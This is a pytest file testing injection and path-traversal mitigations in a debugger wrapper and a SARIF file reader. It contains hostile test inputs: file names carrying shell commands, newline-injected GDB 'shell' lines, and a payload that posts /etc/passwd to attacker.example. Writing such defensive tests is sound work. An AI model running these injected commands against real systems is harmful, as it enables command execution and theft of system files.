"""Tests for debugger/crash_analyser security mitigations (CWE-78, CWE-59)."""

import os
import glob
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest


class TestDebuggerNoPathInjection:
    """Verify debugger.py passes input via stdin, not in GDB scripts."""

    @pytest.fixture
    def debugger(self, tmp_path):
        from packages.binary_analysis.debugger import GDBDebugger
        binary = tmp_path / "test_binary"
        binary.write_text("fake")
        return GDBDebugger(binary)

    def _capture_gdb_script(self, debugger, method_name, input_file, **kwargs):
        """Call a debugger method and capture the GDB script it writes."""
        captured = {}

        def fake_run(cmd, **kw):
            # Read the script file that was written
            for arg_idx, arg in enumerate(cmd):
                if arg == "-x" and arg_idx + 1 < len(cmd):
                    script_path = Path(cmd[arg_idx + 1])
                    if script_path.exists():
                        captured["script"] = script_path.read_text()
            captured["stdin"] = kw.get("stdin")
            result = MagicMock()
            result.stdout = "fake output"
            return result

        input_path = Path(input_file)
        input_path.parent.mkdir(parents=True, exist_ok=True)
        input_path.write_text("crash data")

        with patch("subprocess.run", side_effect=fake_run):
            method = getattr(debugger, method_name)
            if kwargs:
                method(input_path, **kwargs)
            else:
                method(input_path)

        return captured

    def test_backtrace_no_path_in_script(self, debugger, tmp_path):
        input_file = tmp_path / "crash'; shell id; echo '.bin"
        captured = self._capture_gdb_script(debugger, "get_backtrace", input_file)
        assert "shell" not in captured["script"]
        assert str(input_file) not in captured["script"]
        assert "run" in captured["script"]
        assert captured["stdin"] is not None

    def test_registers_no_path_in_script(self, debugger, tmp_path):
        input_file = tmp_path / "evil$(whoami).bin"
        captured = self._capture_gdb_script(debugger, "get_registers", input_file)
        assert str(input_file) not in captured["script"]
        assert captured["stdin"] is not None

    def test_examine_memory_no_path_in_script(self, debugger, tmp_path):
        input_file = tmp_path / "crash`id`.bin"
        captured = self._capture_gdb_script(
            debugger, "examine_memory", input_file, address="0xdeadbeef"
        )
        assert str(input_file) not in captured["script"]
        assert captured["stdin"] is not None

    def test_script_contains_run_not_redirect(self, debugger, tmp_path):
        """Script should have bare 'run', not 'run < path'."""
        input_file = tmp_path / "normal.bin"
        captured = self._capture_gdb_script(debugger, "get_backtrace", input_file)
        lines = captured["script"].strip().split("\n")
        run_lines = [l for l in lines if l.strip().startswith("run")]
        for line in run_lines:
            assert "<" not in line, f"Script contains redirect: {line}"


class TestExamineMemoryAddressValidation:
    """Verify examine_memory() rejects addresses that would inject GDB commands.

    Yeah, not a live exploit path. CrashAnalyser validates addresses before they
    get here, GDB runs as the same user, and nothing currently passes untrusted
    input to this method. It's a public export though, so we do this correctly.
    """

    @pytest.fixture
    def debugger(self, tmp_path):
        from packages.binary_analysis.debugger import GDBDebugger
        binary = tmp_path / "test_binary"
        binary.write_text("fake")
        return GDBDebugger(binary)

    def test_valid_address_accepted(self, debugger, tmp_path):
        """Well-formed hex addresses must work."""
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        # Should not raise; patch subprocess to avoid actually running GDB
        from unittest.mock import patch, MagicMock
        with patch("subprocess.run", return_value=MagicMock(stdout="", returncode=0)):
            debugger.examine_memory(input_file, "0xdeadbeef")
            debugger.examine_memory(input_file, "0x0")
            debugger.examine_memory(input_file, "0xDEADBEEF")
            debugger.examine_memory(input_file, "0x7fff5fbff000")

    def test_newline_injection_rejected(self, debugger, tmp_path):
        """
        A newline in address would let an attacker inject a second GDB command.

        Example: address = "0x1234\\nshell curl -d @/etc/passwd attacker.example"
        Without validation this produces a GDB script line:
            x/64xb 0x1234
            shell curl -d @/etc/passwd attacker.example
        GDB's `shell` command executes the rest as an OS command.
        """
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        malicious = "0x1234\nshell curl -d @/etc/passwd attacker.example"
        with pytest.raises(ValueError, match="Invalid address"):
            debugger.examine_memory(input_file, malicious)

    def test_semicolon_injection_rejected(self, debugger, tmp_path):
        """Semicolons and other non-hex characters are rejected."""
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        for bad in ["0x1234; shell id", "$(id)", "`id`", "0x1234 extra", ""]:
            with pytest.raises(ValueError, match="Invalid address"):
                debugger.examine_memory(input_file, bad)

    def test_bare_integer_rejected(self, debugger, tmp_path):
        """Decimal addresses (no 0x prefix) are rejected — 0x is required."""
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        with pytest.raises(ValueError, match="Invalid address"):
            debugger.examine_memory(input_file, "1234567890")

    def test_overlong_address_rejected(self, debugger, tmp_path):
        """Addresses over 16 hex digits (64-bit max) are rejected."""
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        with pytest.raises(ValueError, match="Invalid address"):
            debugger.examine_memory(input_file, "0x" + "f" * 17)

    def test_non_string_address_rejected(self, debugger, tmp_path):
        """Non-str addresses raise ValueError, not TypeError."""
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        with pytest.raises(ValueError, match="Invalid address"):
            debugger.examine_memory(input_file, 0xdeadbeef)
        with pytest.raises(ValueError, match="Invalid address"):
            debugger.examine_memory(input_file, None)


class TestExamineMemoryByteCountValidation:
    """num_bytes is embedded verbatim into the GDB script. Guard it."""

    @pytest.fixture
    def debugger(self, tmp_path):
        from packages.binary_analysis.debugger import GDBDebugger
        binary = tmp_path / "test_binary"
        binary.write_text("fake")
        return GDBDebugger(binary)

    def test_newline_in_num_bytes_rejected(self, debugger, tmp_path):
        """A str num_bytes with a newline would inject — reject."""
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        with pytest.raises(ValueError, match="Invalid num_bytes"):
            debugger.examine_memory(input_file, "0xdead", "64\nshell id")

    def test_non_positive_rejected(self, debugger, tmp_path):
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        for bad in [0, -1, -64]:
            with pytest.raises(ValueError, match="Invalid num_bytes"):
                debugger.examine_memory(input_file, "0xdead", bad)

    def test_over_cap_rejected(self, debugger, tmp_path):
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        with pytest.raises(ValueError, match="Invalid num_bytes"):
            debugger.examine_memory(input_file, "0xdead", 4097)

    def test_bool_rejected(self, debugger, tmp_path):
        """bool is an int subclass; explicit reject."""
        input_file = tmp_path / "crash.bin"
        input_file.write_text("data")
        with pytest.raises(ValueError, match="Invalid num_bytes"):
            debugger.examine_memory(input_file, "0xdead", True)


class TestDebuggerTempFile:
    """Verify debugger.py uses random temp files and cleans them up."""

    @pytest.fixture
    def debugger(self, tmp_path):
        from packages.binary_analysis.debugger import GDBDebugger
        binary = tmp_path / "test_binary"
        binary.write_text("fake")
        return GDBDebugger(binary)

    def test_no_predictable_path(self, debugger, tmp_path):
        """Script file should NOT be at /tmp/raptor_gdb_script.txt."""
        script_paths = []

        def fake_run(cmd, **kw):
            for i, arg in enumerate(cmd):
                if arg == "-x" and i + 1 < len(cmd):
                    script_paths.append(cmd[i + 1])
            r = MagicMock()
            r.stdout = "fake"
            return r

        with patch("subprocess.run", side_effect=fake_run):
            debugger.run_commands(["run", "quit"])

        assert script_paths
        assert script_paths[0] != "/tmp/raptor_gdb_script.txt"
        assert ".raptor_gdb_" in script_paths[0]

    def test_temp_file_cleaned_up(self, debugger, tmp_path):
        """Script file should be deleted after GDB runs."""
        script_paths = []

        def fake_run(cmd, **kw):
            for i, arg in enumerate(cmd):
                if arg == "-x" and i + 1 < len(cmd):
                    script_paths.append(cmd[i + 1])
                    assert Path(cmd[i + 1]).exists(), "Script should exist during GDB run"
            r = MagicMock()
            r.stdout = "fake"
            return r

        with patch("subprocess.run", side_effect=fake_run):
            debugger.run_commands(["run", "quit"])

        assert script_paths
        assert not Path(script_paths[0]).exists(), "Script should be cleaned up after"

    def test_temp_file_cleaned_up_on_error(self, debugger, tmp_path):
        """Script file should be deleted even if GDB fails."""
        import subprocess as sp

        with patch("subprocess.run", side_effect=sp.TimeoutExpired("gdb", 30)):
            try:
                debugger.run_commands(["run", "quit"])
            except sp.TimeoutExpired:
                pass


class TestLLDBNoPathInjection:
    """Verify LLDB script doesn't contain input file path."""

    def test_lldb_script_no_input_path(self, tmp_path):
        """LLDB process launch should not contain -i {input_file}."""
        from packages.binary_analysis.crash_analyser import CrashAnalyser

        binary = tmp_path / "test_binary"
        binary.write_text("fake")
        input_file = tmp_path / "crash'; shell id'.bin"
        input_file.write_text("crash data")

        with patch.object(CrashAnalyser, '_detect_debugger', return_value='lldb'), \
             patch.object(CrashAnalyser, '_check_tool_availability', return_value={}), \
             patch.object(CrashAnalyser, '_load_symbol_table', return_value={}):
            analyser = CrashAnalyser(str(binary))

        captured_scripts = []
        captured = {}

        def fake_run(cmd, **kw):
            for i, arg in enumerate(cmd):
                if arg == "-s" and i + 1 < len(cmd):
                    script = Path(cmd[i + 1])
                    if script.exists():
                        captured_scripts.append(script.read_text())
            captured["stdin"] = kw.get("stdin")
            r = MagicMock()
            r.stdout = "fake output"
            r.stderr = ""
            r.returncode = 0
            return r

        with patch("subprocess.run", side_effect=fake_run):
            try:
                analyser._run_lldb_analysis(input_file)
            except Exception:
                pass

        if captured_scripts:
            for script in captured_scripts:
                assert str(input_file) not in script, \
                    f"Input file path found in LLDB script: {script[:200]}"
                assert "-i " not in script or str(input_file) not in script, \
                    "LLDB script should not use -i with input file path"


class TestPathTraversal:
    """Verify SARIF file paths are validated against repo root."""

    def test_path_traversal_blocked(self, tmp_path):
        """Paths escaping the repo root should be blocked."""
        from packages.llm_analysis.agent import VulnerabilityContext

        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "safe.py").write_text("print('hello')\n")

        secret = tmp_path / "secret.txt"
        secret.write_text("TOP SECRET")

        finding = {
            "finding_id": "TEST-001",
            "rule_id": "test",
            "file": "../secret.txt",
            "startLine": 1,
            "endLine": 1,
            "snippet": "",
            "message": "test",
            "level": "warning",
            "has_dataflow": False,
        }

        ctx = VulnerabilityContext(finding, repo)
        result = ctx._read_code_at_location("../secret.txt", 1)
        assert "Path traversal blocked" in result
        assert "TOP SECRET" not in result

    def test_legitimate_relative_path_allowed(self, tmp_path):
        """Paths that stay within repo root should work."""
        from packages.llm_analysis.agent import VulnerabilityContext

        repo = tmp_path / "repo"
        src = repo / "src"
        src.mkdir(parents=True)
        (src / "app.py").write_text("line1\nline2\nline3\n")

        finding = {
            "finding_id": "TEST-002",
            "rule_id": "test",
            "file": "src/app.py",
            "startLine": 2,
            "endLine": 2,
            "snippet": "",
            "message": "test",
            "level": "warning",
            "has_dataflow": False,
        }

        ctx = VulnerabilityContext(finding, repo)
        result = ctx._read_code_at_location("src/app.py", 2)
        assert "line2" in result

    def test_dotdot_within_repo_allowed(self, tmp_path):
        """Paths with .. that resolve within repo should work."""
        from packages.llm_analysis.agent import VulnerabilityContext

        repo = tmp_path / "repo"
        (repo / "lib").mkdir(parents=True)
        (repo / "lib" / "utils.py").write_text("def helper():\n    pass\n")

        finding = {
            "finding_id": "TEST-003",
            "rule_id": "test",
            "file": "src/../lib/utils.py",
            "startLine": 1,
            "endLine": 1,
            "snippet": "",
            "message": "test",
            "level": "warning",
            "has_dataflow": False,
        }

        ctx = VulnerabilityContext(finding, repo)
        result = ctx._read_code_at_location("src/../lib/utils.py", 1)
        assert "helper" in result

    def test_file_uri_prefix_handled(self, tmp_path):
        """file:// prefix should be stripped correctly."""
        from packages.llm_analysis.agent import VulnerabilityContext

        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "app.py").write_text("vulnerable_code\n")

        finding = {
            "finding_id": "TEST-004",
            "rule_id": "test",
            "file": "file://app.py",
            "startLine": 1,
            "endLine": 1,
            "snippet": "",
            "message": "test",
            "level": "warning",
            "has_dataflow": False,
        }

        ctx = VulnerabilityContext(finding, repo)
        result = ctx._read_code_at_location("file://app.py", 1)
        assert "vulnerable_code" in result
